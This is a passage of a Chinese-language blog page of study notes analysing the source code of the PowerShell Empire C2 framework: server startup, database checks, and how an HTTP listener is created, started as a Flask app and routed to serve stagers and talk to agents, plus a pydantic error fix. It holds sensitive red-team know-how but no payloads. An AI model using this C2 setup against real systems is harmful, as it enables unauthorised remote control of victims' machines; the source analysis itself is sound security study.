<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        if</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> not</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> os.path.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exists</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;./empire/server/data/empire-chain.pem&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            log.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">info</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Certificate not found. Generating...&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            subprocess.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">call</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;./setup/cert.sh&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            time.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">sleep</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> empire.server.api </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> app</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">initialize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">secure</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">args.secure_api, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">ip</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">args.restip, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">port</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">args.restport)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    sys.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061742430.png" alt="image-20230906174200378"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071541992.png" alt="image-20230907154153426"></p><p>旧版 Empire 默认使用 Sqlite 数据库, 这里则推荐使用 Mysql</p><p>检查完配置项并传入命令行参数后会启动数据库 <code>base.startup_db()</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309061733482.png" alt="image-20230906173319387"></p><p>此函数主要用于检查数据库的初始状态是否正确, 不正确则输出报错提示(一般会在大版本更新的时候出现这种情况)</p><ul><li>创建了一个数据库会话 Session 用于与数据库交互;</li><li>如果当前用了 mysql 的话则检查 <code>unique_check</code> 列, 不存在则创建, 用来作为键值</li><li>创建索引 <code>agent_checkin_idx</code> 来加速对 <code>AgentCheckIn</code> 表的 <code>agent_id</code> 以及 <code>checkin_time</code> 列的查询</li><li>检查并生成用户记录、数据库配置记录、关键词模糊记录以及混淆配置记录的默认配置</li><li>检查数据库表结构与 model 是否一致, 有问题则输出报错并退出程序</li></ul><hr><p>接着就是初始化 main menu, 加载插件与配置:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071544018.png" alt="image-20230907154447961"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071544224.png" alt="image-20230907154401089"></p><hr><p>检查与生成证书, 然后进入 app 初始化函数</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071545870.png" alt="image-20230907154519802"></p><p>加载一堆后端路由:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071547200.png" alt="image-20230907154705101"></p><hr><p>配置 CORS, 创建一个支持异步的 WebSocket 服务器</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071550193.png" alt="image-20230907155022075"></p><hr><p>加载 Starkiller, 证书并启动服务</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071559704.png" alt="image-20230907155924600"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309071600388.png" alt="image-20230907160007220"></p><hr><h3 id="listener" tabindex="-1"><a class="header-anchor" href="#listener"><span>Listener</span></a></h3><blockquote><p><a href="https://tttang.com/archive/1281/" target="_blank" rel="noopener noreferrer">Empire 源码分析(一) - 跳跳糖 (tttang.com)</a></p></blockquote><p>下面开始研究 Empire 中的 <code>listener</code>, <code>stager</code> 与 <code>agent</code></p><ul><li><code>listener</code>: 监听器, C2 服务器需要与被控端连接以向其发布命令, 这就需要开放一个端口来与被控端连接; Empire 中的 http listener 就是起了一个 flask web application, 利用 flask 内置的 WSGI 来作为 server</li><li><code>stager</code> 是一个小心地木马程序 用于在目标机器上执行并与 listener 建立连接; Empire 支持通过 <code>usestager</code> 命令生成不同文件格式的 stager 以适应不同目标系统和执行方式</li><li><code>agent</code> 则是指代被控端</li></ul><hr><p>那么这里以新建与设置 HTTP listener 的流程来 debug 一下项目</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">uselistener</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># Set Port</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">set</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Port</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 9091</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># execute 以使用此 listener</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">execute</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><h4 id="listener-start" tabindex="-1"><a class="header-anchor" href="#listener-start"><span>Listener Start</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">uselistener</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> http</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111411157.png" alt="image-20230911141139416"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111412567.png" alt="image-20230911141221325"></p><p>通过如下 Get 请求匹配 URL 末尾的 listener 类型字符串来获取 listener 模板:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111424540.png" alt="image-20230911142406452"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111423446.png" alt="image-20230911142324365"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111426011.png" alt="image-20230911142657888"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111430685.png" alt="image-20230911143015534"></p><p>这些 listener 是在上图中的类 <code>ListenerTemplateService</code> 初始化时从本地 py 文件加载的:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111431472.png" alt="image-20230911143136364"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111431801.png" alt="image-20230911143120702"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111432701.png" alt="image-20230911143207618"></p><p>这里具体看看 <code>http.py</code> 中是如何写的:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111432150.png" alt="image-20230911143249071"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111433067.png" alt="image-20230911143308960"></p><p>一千多行的 listener 实现, 其中主要的函数有:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309120026688.png" alt="image-20230912002615647"></p><ul><li><code>default_response</code>: IIS 7.5 404 not found page</li><li><code>validate_options</code>: 检查 listener 中必要的 options 是否都设置好了</li><li><code>generate_launcher</code>: 为指定 listener 生成基础的启动器</li><li><code>generate_stager</code>: 生成与该 listener 通信所需的 stager 代码</li><li><code>generate_agent</code>: 生成与该 listener 通信所需的完整的 agent 代码</li><li><code>generate_comms</code>: 仅生成与该 listener 通信所需的 agent 代码块, 从而可以为新的 listener 动态更新 agent</li><li><code>start_server</code>: 根据配置生成与启动相应 Flask APP 线程</li><li><code>start</code>: Listener Start, 启动 <code>start_server()</code> 的线程实例并将其存储在 <code>self.threads</code> 字典中</li><li><code>shutdown</code>: Listener Stop, 中断存储在 <code>self.threads</code> 字典中的 server 线程</li></ul><p>具体函数实现在后面用到时再进行分析</p><hr><p>其结构与 client 端看到的回显一致:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111436012.png" alt="image-20230911143633921"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111540305.png" alt="image-20230911154029899"></p><p>然后可以通过 <code>set Host / set Name</code> 等命令设置各个属性, 然后使用 <code>options</code> 命令进行查看</p><hr><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">execute</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111551298.png" alt="image-20230911155148167"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111551417.png" alt="image-20230911155158288"></p><p>可以看到是发了条 Post 请求, 不过 Server 回显先出现了, 可能和信息打印的顺序有关系, 重新 execute 抓下包看看发了什么</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">tcpdump</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -nn</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -vv</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -w</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 202309111557_测一下httpListenerExecute命令做了什么.pcap</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111604283.png" alt="image-20230911160453109"></p><p>看样子就是把 Listener 的信息放在请求体中发过去了</p><p>查找相应的接口:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111626929.png" alt="image-20230911162653485"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111629254.png" alt="image-20230911162906141"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111632999.png" alt="image-20230911163229863"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111633752.png" alt="image-20230911163340598"></p><p>可以看到又回到 Listener 本身了, 通过 Listener json 信息实例化 Listener 然后调用其 start 函数启动 Listener</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111637592.png" alt="image-20230911163707457"></p><p>定义路由与中间件起一个 Flask app</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111644992.png" alt="image-20230911164414864"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111645112.png" alt="image-20230911164521997"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111646015.png" alt="image-20230911164619885"></p><hr><p>后续交互就可以看下具体的路由了, 这里先简单捋一下</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309120002970.png" alt="image-20230912000225909"></p><ul><li><code>/download/&lt;stager&gt;/</code>: 下载 <code>stager</code></li><li><code>/</code>, <code>/iisstart.htm</code>: 展示首页</li><li><mark>GET, POST</mark> <code>/&lt;path:request_uri&gt;</code>: 用于真正进行 C2 与 agent 之间的通信</li></ul><hr><p>之于前面的外层的 Thread 函数则是为 Listener 的 Flask app 另外起个线程跑:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111648936.png" alt="image-20230911164821706"></p><p>上图中圈起来的两个线程对应两个 Listener 在 <code>start_server</code> 函数中起的 Flask app</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309111650016.png" alt="image-20230911165028907"></p><hr><h4 id="建立连接" tabindex="-1"><a class="header-anchor" href="#建立连接"><span>建立连接</span></a></h4><hr><h2 id="报错处理" tabindex="-1"><a class="header-anchor" href="#报错处理"><span>报错处理</span></a></h2><h3 id="pydantic-importerror-cannot-import-name-field-validator-from-pydantic" tabindex="-1"><a class="header-anchor" href="#pydantic-importerror-cannot-import-name-field-validator-from-pydantic"><span>pydantic-ImportError: cannot import name &#39;field_validator&#39; from &#39;pydantic&#39;</span></a></h3><p><img src="http://cdn.ayusummer233.top/DailyNotes/202411130949742.png" alt="image-20241113094919618"></p><p>这个错误通常是由于 <code>pydantic</code> 版本过低导致的。<code>field_validator</code> 是 <code>pydantic</code> 2.x 版本中的功能，如果使用的是 1.x 版本则无法导入该功能。</p><p>可以检查一下 pydantic 版本</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">python</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;import pydantic; print(pydantic.__version__)&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202411130951395.png" alt="image-20241113095114068"></p><p>将 pydantic 升级到最新版本可以解决这个问题</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">pip3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --upgrade</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> pydantic</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>但是不建议直接走系统默认的 python 环境, 依赖会很乱, 建议[单独配置 poetry 虚拟环境](#单独配置 Poetry 虚拟环境)</p></div><!----><footer class="vp-page-meta"><div class="vp-meta-item edit-link"><a class="auto-link external-link vp-meta-label" href="https://github.com/233Official/dailynotes/edit/main/docs/网络安全/内网渗透/C2/Powershell-Empire.md" aria-label="编辑此页" rel="noopener noreferrer" target="_blank"><!--[--><svg xmlns="http://www.w3.org/2000/svg" class="icon edit-icon" viewBox="0 0 1024 1024" fill="currentColor" aria-label="edit icon" name="edit"><path d="M430.818 653.65a60.46 60.46 0 0 1-50.96-93.281l71.69-114.012 7.773-10.365L816.038 80.138A60.46 60.46 0 0 1 859.225 62a60.46 60.46 0 0 1 43.186 18.138l43.186 43.186a60.46 60.46 0 0 1 0 86.373L588.879 565.55l-8.637 8.637-117.466 68.234a60.46 60.46 0 0 1-31.958 11.229z"></path><path d="M728.802 962H252.891A190.883 190.883 0 0 1 62.008 771.98V296.934a190.883 190.883 0 0 1 190.883-192.61h267.754a60.46 60.46 0 0 1 0 120.92H252.891a69.962 69.962 0 0 0-69.098 69.099V771.98a69.962 69.962 0 0 0 69.098 69.098h475.911A69.962 69.962 0 0 0 797.9 771.98V503.363a60.46 60.46 0 1 1 120.922 0V771.98A190.883 190.883 0 0 1 728.802 962z"></path></svg><!--]-->编辑此页<!----></a></div><div class="vp-meta-item git-info"><div class="update-time"><span class="vp-meta-label">上次编辑于: </span><span class="vp-meta-info" data-allow-mismatch="text">2025/4/17 03:32:15</span></div><div class="contributors"><span class="vp-meta-label">贡献者: </span><!--[--><!--[--><span class="vp-meta-info" title="email: ayusummer233@vip.qq.com">233Mac</span>,<!--]--><!--[--><span class="vp-meta-info" title="email: ayusummer233@vip.qq.com">233</span>,<!--]--><!--[--><span class="vp-meta-info" title="email: ayusummer233@gmail.com">233JG</span>,<!--]--><!--[--><span class="vp-meta-info" title="email: ayusummer233@gmail.com">Ayusummer</span>,<!--]--><!--[--><span class="vp-meta-info" title="email: ayusummr233@gmail.com">233Official</span>,<!--]--><!--[--><span class="vp-meta-info" title="email: ayusummer233@qq.com">咸鱼型233</span>,<!--]--><!--[--><span class="vp-meta-info" title="email: ayusummer233@qq.com">233Official</span><!--]--><!--]--></div></div></footer><nav class="vp-page-nav"><a class="route-link auto-link prev" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" aria-label="代理转发"><div class="hint"><span class="arrow start"></span>上一页</div><div class="link"><!---->代理转发</div></a><a class="route-link auto-link next" href="/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/SSH%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.html" aria-label="横向移动"><div class="hint">下一页<span class="arrow end"></span></div><div class="link">横向移动<!----></div></a></nav><!----><!----><!--]--></main><!--]--><footer class="vp-footer-wrapper" vp-footer><div class="vp-footer">～～～～～</div><div class="vp-copyright">Copyright © 2026 咸鱼型233 </div></footer></div><!--]--><!--]--><!--[--><!----><!--[--><!--]--><!----><!--]--><!--]--></div>
    <script type="module" src="/dailynotes/assets/app-DX9gUdjC.js" defer></script>
  </body>
</html>
